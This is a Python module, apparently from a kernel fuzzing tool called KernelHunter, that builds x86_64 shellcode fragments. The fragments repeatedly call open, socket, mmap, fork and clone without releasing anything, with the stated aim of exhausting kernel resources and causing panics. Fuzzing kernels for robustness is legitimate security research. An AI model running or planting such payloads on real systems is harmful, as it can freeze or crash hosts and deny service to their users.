"""
Module: resource_starvation_attack.py

Description:
Generates resource starvation attack fragments for KernelHunter shellcodes.
Rapidly allocates resources (file descriptors, memory mappings, process forks)
without freeing them, aiming to exhaust kernel-managed resources and trigger
race conditions, allocation failures, or critical system instabilities.

Probable Impact:
- Resource exhaustion (memory, file descriptors, process slots)
- Deadlocks or race conditions during resource cleanup
- Kernel panic due to inability to allocate or manage resources

Risk Level:
Very High - Can destabilize or completely freeze the system under fuzzing.
"""

import random

# Syscall numbers for resource allocation (Linux x86_64)
SYSCALL_OPEN = 2
SYSCALL_SOCKET = 41
SYSCALL_MMAP = 9
SYSCALL_FORK = 57
SYSCALL_CLONE = 56

# Constants
SYSCALL_INSTR = b"\x0f\x05"


def generate_resource_starvation_fragment(min_ops=5, max_ops=15):
    """
    Generates a fragment that aggressively allocates system resources.

    Args:
        min_ops (int): Minimum number of allocation operations.
        max_ops (int): Maximum number of allocation operations.

    Returns:
        bytes: Shellcode fragment stressing system resources.
    """
    num_ops = random.randint(min_ops, max_ops)
    fragment = b""

    resource_syscalls = [
        SYSCALL_OPEN,
        SYSCALL_SOCKET,
        SYSCALL_MMAP,
        SYSCALL_FORK,
        SYSCALL_CLONE,
    ]

    for _ in range(num_ops):
        syscall_choice = random.choice(resource_syscalls)
        setup = b"\x48\xc7\xc0" + syscall_choice.to_bytes(4, byteorder='little')

        # Random argument setups to simulate different allocations
        args_setup = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2"

        fragment += setup + args_setup + SYSCALL_INSTR

    return fragment


# Example usage
if __name__ == "__main__":
    fragment = generate_resource_starvation_fragment()
    print(f"Generated resource starvation fragment: {fragment.hex()}")
